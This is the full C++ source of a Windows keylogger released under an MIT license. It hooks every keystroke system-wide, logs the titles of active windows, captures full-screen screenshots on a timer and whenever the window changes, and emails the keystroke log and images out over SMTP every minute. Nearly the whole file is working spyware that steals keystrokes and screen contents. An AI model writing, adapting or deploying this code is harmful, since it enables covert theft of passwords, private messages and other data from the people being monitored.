/*
MIT License

Copyright (c) 2025 solveditnpc

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include <windows.h>
#include <stdio.h>
#include <string>
#include <curl/curl.h>
#include <fstream>
#include <sstream>
#include <ctime>
#include <gdiplus.h>
#include <vector>
#include <atlimage.h>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "user32.lib")

#define EMAIL_ADDRESS "YOUR_USERNAME"
#define EMAIL_PASSWORD "YOUR_PASSWORD"
#define SEND_REPORT_EVERY 60 // seconds

std::string keylog_data = "KeyLogger Started...";
std::string current_window = "";
HWND last_window = NULL;

// Function to get current timestamp as string
std::string get_timestamp() {
    time_t now = time(0);
    struct tm tstruct;
    char buf[80];
    localtime_s(&tstruct, &now);
    strftime(buf, sizeof(buf), "%Y%m%d_%H%M%S", &tstruct);
    return std::string(buf);
}

// Function to take screenshot
bool take_screenshot(const std::string& filename) {
    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // Get screen dimensions
    int screen_width = GetSystemMetrics(SM_CXSCREEN);
    int screen_height = GetSystemMetrics(SM_CYSCREEN);

    // Create compatible DC and bitmap
    HDC screen_dc = GetDC(NULL);
    HDC mem_dc = CreateCompatibleDC(screen_dc);
    HBITMAP bitmap = CreateCompatibleBitmap(screen_dc, screen_width, screen_height);
    HBITMAP old_bitmap = (HBITMAP)SelectObject(mem_dc, bitmap);

    // Copy screen to bitmap
    BitBlt(mem_dc, 0, 0, screen_width, screen_height, screen_dc, 0, 0, SRCCOPY);

    // Save bitmap to file
    CImage image;
    image.Attach(bitmap);
    image.Save(filename.c_str());

    // Cleanup
    SelectObject(mem_dc, old_bitmap);
    DeleteObject(bitmap);
    DeleteDC(mem_dc);
    ReleaseDC(NULL, screen_dc);
    Gdiplus::GdiplusShutdown(gdiplusToken);

    return true;
}

// Function to send email with attachment
bool send_email_with_attachment(const std::string& message, const std::string& attachment = "") {
    CURL *curl;
    CURLcode res = CURLE_OK;
    struct curl_slist *recipients = NULL;
    
    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.mailtrap.io:2525");
        curl_easy_setopt(curl, CURLOPT_USERNAME, EMAIL_ADDRESS);
        curl_easy_setopt(curl, CURLOPT_PASSWORD, EMAIL_PASSWORD);
        
        std::string from = "Private Person <from@example.com>";
        std::string to = "A Test User <to@example.com>";
        
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, from.c_str());
        recipients = curl_slist_append(recipients, to.c_str());
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

        // Prepare email content with MIME
        std::string email_content = "To: " + to + "\r\n"
                                  "From: " + from + "\r\n"
                                  "Subject: Keylogger Report\r\n"
                                  "MIME-Version: 1.0\r\n"
                                  "Content-Type: multipart/mixed; boundary=boundary\r\n"
                                  "\r\n--boundary\r\n"
                                  "Content-Type: text/plain\r\n\r\n"
                                  + message + "\r\n";

        // Add attachment if provided
        if (!attachment.empty()) {
            std::ifstream file(attachment, std::ios::binary);
            if (file) {
                std::stringstream buffer;
                buffer << file.rdbuf();
                email_content += "\r\n--boundary\r\n"
                               "Content-Type: image/png\r\n"
                               "Content-Disposition: attachment; filename=\"" + 
                               attachment + "\"\r\n"
                               "Content-Transfer-Encoding: base64\r\n\r\n" +
                               buffer.str() + "\r\n--boundary--\r\n";
            }
        }
        
        curl_easy_setopt(curl, CURLOPT_READDATA, email_content.c_str());
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
        
        res = curl_easy_perform(curl);
        
        curl_slist_free_all(recipients);
        curl_easy_cleanup(curl);
        
        return (res == CURLE_OK);
    }
    return false;
}

// Timer function to send reports periodically
VOID CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
    if (!keylog_data.empty()) {
        std::string screenshot_file = "screenshot_" + get_timestamp() + ".png";
        if (take_screenshot(screenshot_file)) {
            if (send_email_with_attachment(keylog_data, screenshot_file)) {
                keylog_data = ""; // Clear the log after successful send
                DeleteFile(screenshot_file.c_str()); // Delete the screenshot after sending
            }
        }
    }
}

// Function to get active window title
std::string get_active_window_title() {
    char window_title[256];
    HWND hwnd = GetForegroundWindow();
    GetWindowTextA(hwnd, window_title, sizeof(window_title));
    return std::string(window_title);
}

LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam) {
    if (code >= 0) {
        KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
        
        // Check for window change
        HWND current_hwnd = GetForegroundWindow();
        if (current_hwnd != last_window) {
            last_window = current_hwnd;
            std::string new_window = get_active_window_title();
            if (new_window != current_window) {
                current_window = new_window;
                keylog_data += "\n\n[Window: " + current_window + "]\n";
                
                // Take screenshot on window change
                std::string screenshot_file = "window_change_" + get_timestamp() + ".png";
                if (take_screenshot(screenshot_file)) {
                    send_email_with_attachment("New window activated: " + current_window, screenshot_file);
                    DeleteFile(screenshot_file.c_str());
                }
            }
        }

        if(wParam == WM_KEYDOWN) {
            std::string key_pressed;
            switch(pkey->vkCode) {
                case VK_RETURN:
                    key_pressed = "(ENTER)\n";
                    break;
                case VK_BACK:
                    key_pressed = "(BACKSPACE)";
                    break;
                case VK_SPACE:
                    key_pressed = " ";
                    break;
                case VK_TAB:
                    key_pressed = "(TAB)";
                    break;
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT:
                    key_pressed = "(SHIFT)";
                    break;
                case VK_CONTROL:
                case VK_LCONTROL:
                    key_pressed = "(CTRL)";
                    break;
                case VK_ESCAPE:
                    key_pressed = "(ESCAPE)";
                    break;
                case VK_END:
                    key_pressed = "(END)";
                    break;
                case VK_HOME:
                    key_pressed = "(HOME)";
                    break;
                case VK_LEFT:
                    key_pressed = "(LEFT)";
                    break;
                case VK_UP:
                    key_pressed = "(UP)";
                    break;
                case VK_RIGHT:
                    key_pressed = "(RIGHT)";
                    break;
                case VK_DOWN:
                    key_pressed = "(DOWN)";
                    break;
                case VK_DELETE:
                    key_pressed = "(DELETE)";
                    break;
                default:
                    // Handle regular characters
                    char key = MapVirtualKey(pkey->vkCode, MAPVK_VK_TO_CHAR);
                    if (key != 0) {
                        key_pressed = key;
                    }
            }
            
            //while testing uncomment the next line below
            //printf("%s", key_pressed.c_str());
            keylog_data += key_pressed;
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main() {
    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    // Initialize curl
    curl_global_init(CURL_GLOBAL_ALL);
    
    // Set up timer for periodic email sending
    SetTimer(NULL, 0, SEND_REPORT_EVERY * 1000, TimerProc);
    
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if(hook == NULL) {
        // while testing uncomment the next line below 
        //printf("Failed to install hook!");
        return 1;
    }
    
    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    UnhookWindowsHookEx(hook);
    curl_global_cleanup();
    Gdiplus::GdiplusShutdown(gdiplusToken);
    return 0;
}